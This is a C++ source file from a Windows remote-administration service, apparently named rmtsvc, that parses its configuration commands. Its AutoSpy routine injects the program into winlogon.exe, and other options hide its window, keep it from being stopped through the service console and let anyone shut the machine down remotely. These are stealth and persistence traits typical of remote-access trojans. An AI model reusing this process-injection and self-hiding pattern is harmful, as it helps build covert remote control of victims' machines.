/*******************************************************************
   *	parseCommand.cpp 
   *    DESCRIPTION:解析配置文件中的配置命令
   *
   *    AUTHOR:yyc
   *
   *    http://hi.baidu.com/yycblog/home
   *
   *    DATE:2005-12-30
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "cInjectDll.h"

//*********************定义全局用户自定义证书参数 statrt ****************************************
std::string g_strMyCert="";
std::string g_strMyKey="";
std::string g_strKeyPswd="";
std::string g_strCaCert="";
std::string g_strCaCRL="";
//设置ssl证书和CRL信息 命令格式: 
//	ssls [mycert=<用户SSL证书文件>] [mykey=<用户证书私钥文件>] [keypwd=<用户私钥密码>] [caroot=<CA根证书>] [cacrl=<CA作废证书列表>]
//此参数支持的证书文件格式为PEM格式
void docmd_ssls(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	if( (it=maps.find("mycert"))!=maps.end()) 
		g_strMyCert=(*it).second;
	else g_strMyCert="";
	if( (it=maps.find("mykey"))!=maps.end()) 
		g_strMyKey=(*it).second;
	else g_strMyKey="";
	if( (it=maps.find("keypwd"))!=maps.end()) 
		g_strKeyPswd=(*it).second;
	else g_strKeyPswd="";
	if( (it=maps.find("caroot"))!=maps.end()) 
		g_strCaCert=(*it).second;
	else g_strCaCert="";
	if( (it=maps.find("cacrl"))!=maps.end()) 
		g_strCaCRL=(*it).second;
	else g_strCaCRL="";
	//yyc modify 2007-01-24
	if(g_strMyCert!="") getAbsolutfilepath(g_strMyCert);
	if(g_strMyKey!="") getAbsolutfilepath(g_strMyKey);
	if(g_strCaCert!="") getAbsolutfilepath(g_strCaCert);
	if(g_strCaCRL!="") getAbsolutfilepath(g_strCaCRL);
}
//*********************定义全局用户自定义证书参数  end  ****************************************
//启动自动监视
BOOL MyService::AutoSpy(const char *commandline)
{
	std::string strProcessname=(m_bDebug)?"explorer.exe":"winlogon.exe";
	cInjectDll inject(strProcessname.c_str());	
	DWORD dwret=inject.Inject(NULL);
	if(dwret)
	{
		DWORD dwCreationFlags=(m_bDebug)?0:CREATE_NO_WINDOW;
		dwret=inject.spySelf(m_hStop,dwCreationFlags,commandline);
		if(dwret==0) 
			RW_LOG_PRINT(LOGLEVEL_INFO,"Success to spy,injecting into %s.\r\n",strProcessname.c_str());
		else
			RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to inject into %s, Error Code=%d.\r\n",
										strProcessname.c_str(),(long)dwret);
		return (dwret==0)?TRUE:FALSE;
	}else
		RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to open %s for Injection.\r\n",strProcessname.c_str());
	return FALSE;
}
//创建定时任务 at=hh:mm/[t|d]
bool MyService::CreateTaskTime(const char *ptrAt,const char *strTask)
{
	if(ptrAt==NULL || strTask==NULL) return false;

	TaskTimer task; task.h=task.m=task.flag=task.type=0;
	task.strTask.assign(cUtils::strTrim((char *)strTask)); 
	char c=0; //定时任务类型
	if(strchr(ptrAt,':'))
		 ::sscanf(ptrAt,"%d:%d/%c",&task.h,&task.m,&c);
	else ::sscanf(ptrAt,"%d/%c",&task.h,&c);
	
	if(c=='d') //每天定时执行
		task.type=c;
	else if(c=='t') //定时间隔执行
		task.type=c;
	if(task.type==0) return false;
	RW_LOG_PRINT(LOGLEVEL_INFO,"TaskTimer: h=%d,m=%d,type=%c\r\n\t%s\r\n",
		task.h,task.m,c,task.strTask.c_str());
	m_tasklist.push_back(task); return true;
}

//ini文件支持的命令
void MyService::parseCommand(const char *strCommand)
{
	if(strCommand==NULL || strCommand[0]==0) return;
	while(*strCommand==' ') strCommand++;
	char *ptrAt=(char *)strstr(strCommand," at=");
	if(ptrAt){//此命令为定时任务
		*ptrAt='\0';
		CreateTaskTime(ptrAt+4,strCommand);
		*ptrAt=' '; return;
	}//?if(ptrAt){//此命令为定时任务
	
	if(strncasecmp(strCommand,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strCommand+8,' ',maps)<=0) return;
		std::map<std::string,std::string>::iterator it=maps.find("type");
		if(it!=maps.end() && (*it).second=="webs") 
		{	m_websvr.docmd_webiprules(strCommand+8); return; }
		else if(it!=maps.end() && (*it).second=="telnet")
		{	m_telsvr.docmd_iprules(strCommand+8); return; }
		//否则接着交m_vidcManager.parseCommand(pstart);解释
	}//?if(strncasecmp(strCommand,"iprules ",8)==0)

	if(strncasecmp(strCommand,"sets ",5)==0) //设置本服务的信息
		this->docmd_sets(strCommand+5);
	else if(strncasecmp(strCommand,"ssls ",5)==0) //设置ssl证书信息
		docmd_ssls(strCommand+5);
	else if(strncasecmp(strCommand,"telnet ",7)==0) //设置telnet
		m_telsvr.docmd_sets(strCommand+7);
	else if(strncasecmp(strCommand,"webs ",5)==0) //设置本服务信息
		m_websvr.docmd_webs(strCommand+5);
	else if(strncasecmp(strCommand,"user ",5)==0)
		m_websvr.docmd_user(strCommand+5);
/*  //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"msnbot ",7)==0)
		m_msnbot.docmd_msnbot(strCommand+7);
	else if(strncasecmp(strCommand,"proxy ",6)==0)
		m_msnbot.docmd_proxy(strCommand+6);
*/ //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"kill ",5)==0) //杀死指定的进程
		::docmd_kill(strCommand+5);
	else if(strncasecmp(strCommand,"exec ",5)==0) //执行指定的程序
		::docmd_exec(strCommand+5);
	else if(strncasecmp(strCommand,"cmdpage ",8)==0)
		m_preCmdpage.assign(strCommand+8);
	//否则交m_vidcManager.parseCommand(pstart);解释
	else m_vidcManager.parseCommand(strCommand);
}

//设置本服务的信息
//命令格式: 
//	sets [log=<日志输出文件>] [opentype=APPEND] [loglevel=DEBUG|INFO|WARN|ERROR]
//log=<日志输出文件> : 设置程序是否数促日志文件，如果不指定则不输出否则输出指定的日志文件
//opentype=APPEND    : 设置程序启动时是否为追加写日志文件还是覆盖写,如果不设置此项则为覆盖写
//loglevel=DEBUG|INFO|WARN|ERROR : 设置日志输出的级别，默认为INFO级别
//stop_pswd=<停止服务的密码> : 设置停止服务的密码，如果设置了密码则不输入密码将无法停止服务。
//		如果设置了密码用户只能在命令行下通过-e <密码> 命令停止服务，而无法通过SCM服务控制台或net stop命令停止服务。
//		假如程序名为xx.exe,设置了停止密码为123，则要停止此服务需在命令行下输入xx.exe -e 123
//faceless=TRUE : 如果以非服务方式启动且运行时没有指定-d参数则以无窗口的形式运行本程序
//		例如双击直接运行本程序时，如果设置了此项则以无窗口的形式运行，即使关闭控制台窗口程序也不会结束
//		否则以带窗口的形式运行按Ctrl+c或者关闭窗口则程序将结束
void MyService :: docmd_sets(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("opentype"))!=maps.end())
	{//设置日志文件为追加写的方式
		if((*it).second=="APPEND")
			RW_LOG_OPENFILE_APPEND();
	}
	if( (it=maps.find("log"))!=maps.end())
	{//设置日志文件
		if((*it).second!="" && (*it).second!="null")
		{
			getAbsolutfilepath((*it).second);
			RW_LOG_SETFILE((long)(*it).second.c_str())
		}
	}
	if( (it=maps.find("loglevel"))!=maps.end())
	{//设置日志输出级别
		if((*it).second=="DEBUG")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_DEBUG)
		else if((*it).second=="INFO")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_INFO)
		else if((*it).second=="WARN")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_WARN)
		else if((*it).second=="ERROR")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_ERROR)
	}

	if( (it=maps.find("spyself"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bSpyself=false;
	}
	if( (it=maps.find("stop_pswd"))!=maps.end())
	{
		if( (*it).second!="") CreateStopEvent((*it).second.c_str());
	} 
	if( (it=maps.find("faceless"))!=maps.end())
	{
		if( (*it).second=="TRUE" ) m_bFaceless=true;
	}
	if( (it=maps.find("install"))!=maps.end())
	{
		if( (*it).second=="TRUE") InstallService();
	}
}

//设置web服务的相关信息
//命令格式: 
//	webs [port=<web服务端口>] [bindip=<本服务绑定的本机IP>] [root=<主目录>] [access=<对主目录的访问权限>] [default=<默认文档>]
//port=<服务端口>    : 设置服务端口，如果不设置则默认为7778.设置为0则不启动web服务 <0则随即分配端口
//bindip=<本服务绑定的本机IP> : 设置本服务绑定的本机IP，如果不设置则默认绑定本机所有IP
//root=<主目录>     : 指定此web服务的根/对应的主目录。主目录是运行本服务本地机的实际绝对路径
//					如果主目录中包含空格则要用""将主目录括起
//					如果主目录等于""或空则默认根目录为服务程序所在目录
//access=<对主目录的访问权限> : 指定此主目录的访问权限。
//		如果不设置则默认具有ACCESS_NONE访问权限。设置格式和含义如下
//		<对主目录的访问权限> : <FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST|DIR_NOINHERIT>
//		ACCESS_ALL=FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST
//		FILE_READ : 读取 FILE_WRITE : 写入 FILE_EXEC : 执行
//		DIR_LIST : 目录浏览
//		DIR_NOINHERIT : 是否允许此虚目录对应的真实路径下的子目录继承用户指定的目录访问权限。
//default=<默认文档>
//resource=<FALSE> : 不从程序资源中获取文件
void webServer :: docmd_webs(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("port"))!=maps.end())
	{//设置服务的端口
		m_svrport=atoi((*it).second.c_str());
	}
	if( (it=maps.find("bindip"))!=maps.end())
	{//设置服务绑定IP
		m_bindip=(*it).second;
	}
	if( (it=maps.find("poweroff"))!=maps.end())
	{//是否无需权限可直接远程关机或重启
		if((*it).second=="ANYONE") m_bPowerOff=true;
	}
	if( (it=maps.find("resource"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bGetFileFromRes=false;
	}

	long lAccess=HTTP_ACCESS_NONE;
	std::string rootpath,defaultPage;
	if( (it=maps.find("root"))!=maps.end())
		rootpath=(*it).second;
	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"FILE_READ")) lAccess|=HTTP_ACCESS_READ;
		if(strstr(ptr,"FILE_WRITE")) lAccess|=HTTP_ACCESS_WRITE;
		if(strstr(ptr,"FILE_EXEC")) lAccess|=HTTP_ACCESS_EXEC;
		if(strstr(ptr,"DIR_LIST")) lAccess|=HTTP_ACCESS_LIST;
		if(strstr(ptr,"DIR_NOINHERIT")) lAccess|=HTTP_ACCESS_SUBDIR_INHERIT;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=HTTP_ACCESS_ALL;
	}
	if(!m_bGetFileFromRes) //如果指定不从exe资源中获取web页面，那么最少需要只读权限
			lAccess|=HTTP_ACCESS_READ;

	if( (it=maps.find("default"))!=maps.end())
		defaultPage=(*it).second;
	this->setRoot(rootpath.c_str(),lAccess,defaultPage.c_str());
	
	//web服务的SSL支持配置参数
	if( (it=maps.find("ssl_enabled"))!=maps.end() && (*it).second=="true")
		m_bSSLenabled=true;
	else m_bSSLenabled=false;
	if( (it=maps.find("ssl_verify"))!=maps.end() && (*it).second=="true")
		m_bSSLverify=true;
	else m_bSSLverify=false;
	
	return;
}

//设置web服务的ip过滤规则或针对某个帐号的IP过滤规则
//命令格式:
//	webiprules [access=0|1] ipaddr="<IP>,<IP>,..."
//access=0|1     : 对符合下列IP条件的是拒绝还是放行
//例如:
// webiprules access=0 ipaddr="192.168.0.*,192.168.1.10"
void webServer :: docmd_webiprules(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	int ipaccess=1;
	if( (it=maps.find("access"))!=maps.end())
		ipaccess=atoi((*it).second.c_str());
	
	if( (it=maps.find("ipaddr"))!=maps.end())
	{
		std::string ipRules=(*it).second;
		this->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
	}else this->rules().addRules_new(RULETYPE_TCP,ipaccess,NULL);

	return;
}

//设置访问者帐号权限信息
//命令格式：
//	user account=<帐号> [pswd=<帐号密码>] [acess=<帐号的访问权限>]
//account=<访问帐号> : 必须项. 要添加的rmtsvc访问者帐号。
//pswd=<帐号密码>    : 必须项. 指定帐号的密码
//access=<帐号的访问权限>
//	如果不设置则默认具有ACCESS_NONE访问权限。设置格式和含义如下
//		ACCESS_ALL=ACCESS_SCREEN_ALL|ACCESS_FILE_ALL|ACCESS_REGIST_ALL|ACCESS_SERVICE_ALL|ACCESS_TELNET_ALL;
//		ACCESS_SCREEN_ALL: 远程屏幕完全控制权限
//		ACCESS_SCREEN_VIEW: 远程查看屏幕权限
//		ACCESS_FILE_ALL  : 远程文件管理操作，可读写删除等
//		ACCESS_FILE_VIEW : 远程文件管理紧紧允许读，下载
//		ACCESS_REGIST_ALL: 远程注册表管理可读写添加删除等
//		ACCESS_REGIST_VIEW:紧紧可查看注册表信息
//		ACCESS_SERVICE_ALL:远程服务管理，可完全操作
//		ACCESS_SERVICE_VIEW:远程服务权利仅仅可查看
//		ACCESS_TELNET_ALL:  远程telnet管理
//		ACCESS_FTP_ADMIN : 远程FTP服务配置管理
void webServer :: docmd_user(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	std::string user,pswd;
	long lAccess=RMTSVC_ACCESS_NONE;
	if( (it=maps.find("account"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"ACCESS_SCREEN_VIEW")) lAccess|=RMTSVC_ACCESS_SCREEN_VIEW;
		if(strstr(ptr,"ACCESS_SCREEN_ALL")) lAccess|=RMTSVC_ACCESS_SCREEN_ALL;
		if(strstr(ptr,"ACCESS_REGIST_VIEW")) lAccess|=RMTSVC_ACCESS_REGIST_VIEW;
		if(strstr(ptr,"ACCESS_REGIST_ALL")) lAccess|=RMTSVC_ACCESS_REGIST_ALL;
		if(strstr(ptr,"ACCESS_SERVICE_VIEW")) lAccess|=RMTSVC_ACCESS_SERVICE_VIEW;
		if(strstr(ptr,"ACCESS_SERVICE_ALL")) lAccess|=RMTSVC_ACCESS_SERVICE_ALL;
		if(strstr(ptr,"ACCESS_TELNET_VIEW")) lAccess|=RMTSVC_ACCESS_TELNET_VIEW;
		if(strstr(ptr,"ACCESS_TELNET_ALL")) lAccess|=RMTSVC_ACCESS_TELNET_ALL;
		if(strstr(ptr,"ACCESS_FILE_VIEW")) lAccess|=RMTSVC_ACCESS_FILE_VIEW;
		if(strstr(ptr,"ACCESS_FILE_ALL")) lAccess|=RMTSVC_ACCESS_FILE_ALL;
		if(strstr(ptr,"ACCESS_FTP_ADMIN")) lAccess|=RMTSVC_ACCESS_FTP_ADMIN;
		if(strstr(ptr,"ACCESS_VIDC_ADMIN")) lAccess|=RMTSVC_ACCESS_VIDC_ADMIN;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=RMTSVC_ACCESS_ALL;
	}
	if(user!="" && lAccess!=RMTSVC_ACCESS_NONE)
	{
		::_strlwr((char *)user.c_str());
		std::pair<std::string,long> p(pswd,lAccess);
		m_mapUsers[user]=p;
	}
	m_bAnonymous=false; //如果配置了账号则不允许匿名访问
}
/* //yyc remove MSN 2010-11-05
//设置msn机器人相关信息
//命令格式:
//	msnbot account=<msn帐号>:<密码> [trusted=<受信任的msn帐号>] [prefix="<移动MSN返回消息前缀>"]
//account=<msn帐号>:<密码> : 指定msn机器人的登录帐号和密码.
//trusted=<受信任的msn帐号>: 指定msn机器人信任的msn帐号，
//			  此帐号和msn机器人聊天控制无需输入控制访问密码
//			  可输入多个帐号，用','分割
//prefix="<移动MSN返回消息前缀>"
BOOL msnShell :: docmd_msnbot(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("account"))!=maps.end())
	{//格式 ：account:password
		this->setMsnAccount((*it).second.c_str());
		const char *ptr=strchr((*it).second.c_str(),':');
		if(ptr)
		{
			MyService *ptrService=MyService::GetService();
			webServer *pwwwSvc=&ptrService->m_websvr;//指向www服务的指针
			*(char *)ptr=0; ptr++; char s[128]; 
			sprintf(s,"account=%s pswd=%s access=ACCESS_ALL",(*it).second.c_str(),ptr);
			pwwwSvc->docmd_user(s);
		}
	}
	if( (it=maps.find("trusted"))!=maps.end())
	{
		this->m_strTrusted=(*it).second;
		::_strlwr((char *)this->m_strTrusted.c_str());
	}
	if( (it=maps.find("prefix"))!=maps.end())
	{
		this->m_prefix==(*it).second;
	}else this->m_prefix="对方正在使用手机MSN,详见http://mobile.msn.com.cn。";
		            
	return TRUE;
}

//设置msn机器人的代理信息
//命令格式: 
//	proxy type=HTTPS|SOCKS4|SOCKS5 host=<代理服务地址> port=<代理服务端口> [user=<访问代理服务帐号>] [pswd=<访问代理服务密码>]
BOOL msnShell :: docmd_proxy(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	PROXYTYPE ptype=PROXY_NONE;
	int proxyport=0;
	std::string host,user,pswd;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("type"))!=maps.end())
	{
		if((*it).second=="HTTPS")
			ptype=PROXY_HTTPS;
		else if((*it).second=="SOCKS4")
			ptype=PROXY_SOCKS4;
		else if((*it).second=="SOCKS5")
			ptype=PROXY_SOCKS5;
	}
	if( (it=maps.find("port"))!=maps.end())
		proxyport=atoi((*it).second.c_str());
	
	if( (it=maps.find("host"))!=maps.end())
		host=(*it).second;
	if( (it=maps.find("user"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( m_curAccount.m_chatSock.setProxy(ptype,host.c_str(),
		proxyport,user.c_str(),pswd.c_str()) )
		return TRUE;
	return FALSE;
}
*/ //yyc remove MSN 2010-11-05
//------------------------------------private function----------------------
int splitString(const char *str,char delm,std::map<std::string,std::string> &maps)
{
//	printf("split String - %s\r\n",str);
	if(str==NULL) return 0;
	while(*str==' ') str++;//删除前导空格
	const char *ptr,*ptrStart,*ptrEnd;
	while( (ptr=strchr(str,'=')) )
	{
		char dm=delm; ptrStart=ptr+1;
		if(*ptrStart=='"') {dm='"'; ptrStart++; }
		ptrEnd=ptrStart;
		while(*ptrEnd && *ptrEnd!=dm) ptrEnd++;

		*(char *)ptr=0;
		::_strlwr((char *)str);
		maps[str]=std::string(ptrStart,ptrEnd-ptrStart);
		*(char *)ptr='=';

		if(*ptrEnd==0) break;
		str=ptrEnd+1;
		while(*str==' ') str++;//删除前导空格
	}//?while(ptr)
	
//	std::map<std::string,std::string>::iterator it=maps.begin();
//	for(;it!=maps.end();it++)
//		printf("\t %s - %s.\r\n",(*it).first.c_str(),(*it).second.c_str());

	return maps.size();
}

int splitString(const char *str,char delm,std::vector<std::string> &vec,int maxSplit)
{
	if(str==NULL) return 0;
	while(*str==' ') str++;//删除前导空格
	const char *ptr=strchr(str,delm);
	while(true)
	{
		if(maxSplit>0 && vec.size()>=maxSplit)
		{
			vec.push_back(str); break;
		}
		if(ptr) *(char *)ptr=0;
		vec.push_back(str);
		if(ptr==NULL) break;
		*(char *)ptr=delm; str=ptr+1;
		while(*str==' ') str++;//删除前导空格
		ptr=strchr(str,delm);
	}//?while
	return vec.size();
}
